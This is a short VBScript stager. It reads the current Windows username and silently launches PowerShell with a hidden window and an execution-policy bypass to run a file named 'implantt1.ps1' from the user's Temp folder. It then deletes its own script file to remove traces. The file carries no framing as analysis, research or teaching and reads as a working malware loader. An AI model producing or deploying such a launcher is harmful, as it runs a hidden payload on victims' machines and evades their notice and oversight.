Set objShell = CreateObject("WScript.Shell")
Set objNetwork = CreateObject("WScript.Network")
username = objNetwork.UserName

objShell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\" & username & "\AppData\Local\Temp\implantt1.ps1""", 0

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile WScript.ScriptFullName
